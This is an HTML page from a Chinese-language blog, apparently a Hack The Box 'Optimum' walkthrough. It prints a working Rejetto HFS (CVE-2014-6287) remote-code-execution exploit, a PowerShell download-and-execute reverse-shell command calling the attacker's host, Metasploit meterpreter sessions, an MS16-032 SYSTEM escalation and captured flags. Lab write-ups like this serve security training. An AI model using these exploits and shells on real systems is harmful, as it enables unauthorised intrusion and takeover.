<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Optimum - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Optimumé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Optimum] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.8             Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-">
<meta property="og:type" content="article">
<meta property="og:title" content="Optimum - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Optimumé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Optimum] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.8             Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/5cecf411-151e-4885-b215-eae21359ce0d.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/9700ccb2-fc63-442b-8417-225c9ec8d507.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/4cdb23da-f556-4b4e-b977-23ab9a56774a.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/8c342218-4e7e-4e45-a7fd-e65d001f6575.png">
<meta property="article:published_time" content="2022-03-10T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:48:20.987Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/5cecf411-151e-4885-b215-eae21359ce0d.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Optimum - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Optimum - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-03-10T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-03-10
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Optimum"><span class="post-toc-text">Hackthebox - Optimum</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Searchsploit"><span class="post-toc-text">Searchsploit</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•-1"><span class="post-toc-text">æ–¹æ³• 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•-2"><span class="post-toc-text">æ–¹æ³• 2</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-text">æƒé™æå‡</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Optimum"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Optimum - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-03-10 19:38:36" datetime="2022-03-10T11:38:36.000Z"  itemprop="datePublished">2022-03-10</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Optimum"><a href="#Hackthebox-Optimum" class="headerlink" title="Hackthebox - Optimum"></a>Hackthebox - Optimum</h1><h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h2><img src="/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/5cecf411-151e-4885-b215-eae21359ce0d.png" class>

<h2 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h2><img src="/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/9700ccb2-fc63-442b-8417-225c9ec8d507.png" class>

<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.8            
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-09 23:06 EST
Nmap scan report for 10.10.10.8
Host is up (0.52s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   477.43 ms 10.10.16.1
2   477.52 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.98 seconds
</code></pre>
<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>åªæœ‰ä¸€ä¸ª80ç«¯å£å¼€ç€ï¼Œå»çœ‹çœ‹HTTPçš„å†…å®¹</p>
<img src="/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/4cdb23da-f556-4b4e-b977-23ab9a56774a.png" class>

<p>è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªæ–‡ä»¶æœåŠ¡å™¨ï¼Œè¯•è¯•æœ‰æ²¡æœ‰å¼±å£ä»¤å¯ä»¥ç™»å½•çš„</p>
<img src="/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/8c342218-4e7e-4e45-a7fd-e65d001f6575.png" class>

<p>æµ‹è¯•äº†å‡ ä¸ªå¼±å£ä»¤ï¼Œéƒ½æ²¡ç™»å½•è¿›å»ï¼Œçœ‹çœ‹å…¶ä»–æ–¹æ³•</p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªHttpFileServer 2.3ï¼Œå»searchsploitä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´</p>
<h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]
â””â”€# searchsploit HttpFileServer 2.3
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                       | windows/webapps/49125.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>è¿™é‡Œç¡®å®æœ‰ä¸€ä¸ªRCEï¼Œæµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ç”¨</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]
â””â”€# cat CVE-2014-6287.py 
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:&quot;httpfileserver 2.3&quot;
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Ã“scar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

#!/usr/bin/python3

# Usage :  python3 Exploit.py &lt;RHOST&gt; &lt;Target RPORT&gt; &lt;Command&gt;
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 &quot;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.4/shells/mini-reverse.ps1&#39;)&quot;

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()
        url = f&#39;http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}&#39;
        print(url)
        response = http.request(&#39;GET&#39;, url)

except Exception as ex:
        print(&quot;Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command&quot;)
        print(ex)
</code></pre>
<p>å°è¯•æ‰§è¡Œä¸€ä¸‹</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]
â””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 whoami
http://10.10.10.8:80/?search=%00{.+exec|whoami.}
</code></pre>
<p>è¿™é‡Œæ²¡æœ‰ç»™æˆ‘ä»»ä½•å›æ˜¾ï¼Œæˆ‘ä¸ç¡®å®šæ˜¯å¦æ‰§è¡ŒæˆåŠŸäº†ï¼Œå»æµ‹è¯•ä¸€ä¸‹å§</p>
<p>æœ¬åœ°ä½¿ç”¨tcpdumpç›‘å¬ä¸€ä¸‹ç½‘å¡ï¼Œç„¶åæ‰§è¡Œä¸€ä¸‹pingæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]
â””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 &quot;ping 10.10.16.3&quot;
http://10.10.10.8:80/?search=%00{.+exec|ping%2010.10.16.3.}
</code></pre>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# tcpdump -i tun0     
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:25:22.516278 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [S], seq 2814804000, win 64240, options [mss 1460,sackOK,TS val 3571996960 ecr 0,nop,wscale 7], length 0
23:25:22.747740 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [S.], seq 3736611079, ack 2814804001, win 8192, options [mss 1355,nop,wscale 8,sackOK,TS val 122838 ecr 3571996960], length 0
23:25:22.747788 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 0
23:25:22.747968 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 142: HTTP: GET /?search=%00%7B.+exec%7Cping%2010.10.16.3.%7D HTTP/1.1
23:25:23.203303 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 1:219, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 218: HTTP: HTTP/1.1 200 OK
23:25:23.203352 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 219, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0
23:25:23.203376 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], seq 219:1562, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP
23:25:23.203381 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1562, win 498, options [nop,nop,TS val 3571997647 ecr 122884], length 0
23:25:23.204028 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 1562:1679, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP
23:25:23.204036 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1679, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0
23:25:23.434280 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], seq 1679:3022, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP
23:25:23.434317 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 3022, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0
23:25:23.434339 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 3022:3139, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP
23:25:23.434346 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 3139, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0
23:25:23.434354 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 3139:4164, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1025: HTTP
23:25:23.434359 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 4164, win 498, options [nop,nop,TS val 3571997878 ecr 122884], length 0
23:25:23.437193 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [F.], seq 143, ack 4164, win 501, options [nop,nop,TS val 3571997881 ecr 122884], length 0
23:25:23.879455 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0
23:25:24.151025 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [F.], seq 4164, ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0
23:25:24.151044 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 4165, win 501, options [nop,nop,TS val 3571998595 ecr 122953], length 0
23:25:47.421881 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172
23:25:48.422841 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172
23:25:49.424354 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172
23:25:50.425946 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172
</code></pre>
<p>ç¡®å®æ˜¯æˆåŠŸè¢«æ‰§è¡Œäº†ï¼Œé‚£å°±å¯ä»¥ç¡®è®¤è¯¥æ¼æ´æ˜¯å­˜åœ¨ï¼Œå¹¶ä¸”exploitä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ–¹æ³•-1"><a href="#æ–¹æ³•-1" class="headerlink" title="æ–¹æ³• 1"></a>æ–¹æ³• 1</h3><p>æ—¢ç„¶çŸ¥é“äº†ä»€ä¹ˆæ¼æ´å¯ä»¥ç”¨ï¼Œé‚£å°±ç®€å•äº†ï¼Œæ¥æ„é€ POCå§</p>
<p>æ ¹æ®CVE-2014-6287çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä½¿ç”¨powershellè¿›è¡Œå›å¼¹ä¸€ä¸ªshellï¼Œå’±ä»¬æ‰¾ä¸€ä¸ªpowershellçš„åˆ©ç”¨å·¥å…·</p>
<blockquote>
<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></p>
</blockquote>
<p>æˆ‘è¿™è¾¹æ˜¯æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬ï¼Œå’±ä»¬ç»™ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åå»å°è¯•æ‰§è¡Œ</p>
<p>ç„¶åç¨å¾®ä¿®æ”¹ä¸€ä¸‹</p>
<pre><code class="bash">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
</code></pre>
<p>æˆ‘ä»¬å°†è¿™å¥ä»£ç å¤åˆ¶ä¸‹æ¥ï¼Œç²˜è´´åˆ°ä»£ç æœ€åº•éƒ¨ï¼Œç„¶åæŠŠIPä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„IP</p>
<p>ç„¶ååœ¨æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p>
<pre><code class="bash">python3 -m http.server 80
</code></pre>
<p>ç„¶åä½¿ç”¨expè¿›è¡Œä¸‹è½½</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]
â””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 &quot;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.3/Invoke-PowerShellTcp.ps1&#39;)&quot;
http://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.16.3/Invoke-PowerShellTcp.ps1%27%29.}
</code></pre>
<pre><code class="bash">PS C:\Users\kostas\Desktop&gt; whoami
optimum\kostas
</code></pre>
<p>æˆåŠŸå¾—åˆ°äº†shell</p>
<h3 id="æ–¹æ³•-2"><a href="#æ–¹æ³•-2" class="headerlink" title="æ–¹æ³• 2"></a>æ–¹æ³• 2</h3><pre><code class="bash">msf6 &gt; search HttpFileServer 2.3

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 &gt; use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
</code></pre>
<p>msfconsoleå¯ä»¥ç›´æ¥ä½¿ç”¨</p>
<pre><code class="bash">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; show options 

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.8       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     10.10.16.3       yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic
</code></pre>
<p>è®¾ç½®å¥½ç›¸å…³é…ç½®ï¼Œç„¶åæ‰§è¡Œ</p>
<pre><code class="bash">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.3:5555 
[*] Using URL: http://0.0.0.0:8080/zKFWDMqMmVKxA
[*] Local IP: http://192.168.200.128:8080/zKFWDMqMmVKxA
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /zKFWDMqMmVKxA
[*] Sending stage (175174 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\UZMLMeDqW.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.16.3:5555 -&gt; 10.10.10.8:49178) at 2022-03-10 00:02:29 -0500
[*] Server stopped.

meterpreter &gt; getuid
Server username: OPTIMUM\kostas
meterpreter &gt; sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
</code></pre>
<p>è¿™è¾¹ä¹ŸæˆåŠŸæ‹¿åˆ°äº†shell</p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>ä½¿ç”¨systeminfoæˆ–å…¶ä»–æ–¹å¼éƒ½å¯ä»¥çœ‹åˆ°è¡¥ä¸ä¿¡æ¯</p>
<p>å»æœæŸ¥è¡¥ä¸ä¿¡æ¯ï¼Œæˆ–æ˜¯ä½¿ç”¨msfçš„ææƒè¾…åŠ©è„šæœ¬éƒ½å¯ä»¥çŸ¥é“</p>
<p>è¿™è¾¹MSFæœ‰ä¸ªææƒå¯ç”¨è„šæœ¬</p>
<pre><code class="bash">use windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit
</code></pre>
<pre><code class="bash">msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.3:4444 
[+] Compressed size: 1016
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\IQyTwKukUqs.ps1...
[*] Compressing script contents...
[+] Compressed size: 3588
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -&gt; @FuzzySec]

[?] Operating system core count: 2
[&gt;] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1936

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[&gt;] Wiping current impersonation token
[&gt;] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2024
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[&gt;] Duplicating SYSTEM token
[&gt;] Starting token race
[&gt;] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

xQiD0FWfxy0Q3rUwptuxobxZ7Fk20m8U
[+] Executed on target machine.
[*] Sending stage (200262 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.16.3:4444 -&gt; 10.10.10.8:49188) at 2022-03-10 00:34:05 -0500
[+] Deleted C:\Users\kostas\AppData\Local\Temp\IQyTwKukUqs.ps1

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°systemæƒé™</p>
<pre><code class="bash">meterpreter &gt; search -f user.txt.txt
Found 1 result...
    c:\Users\kostas\Desktop\user.txt.txt (32 bytes)
meterpreter &gt; cat &#39;c:\Users\kostas\Desktop\user.txt.txt&#39;
d0c39409d7b994a9a1389ebf38ef5f73
</code></pre>
<pre><code class="bash">meterpreter &gt; search -f root.txt
Found 1 result...
    c:\Users\Administrator\Desktop\root.txt (32 bytes)
meterpreter &gt; cat &#39;c:\Users\Administrator\Desktop\root.txt&#39;
51ed1b36553c8461f4552c2e92b3eeed
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°userå’Œrootæƒé™çš„flagæ–‡ä»¶</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/&title=ã€ŠOptimum - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
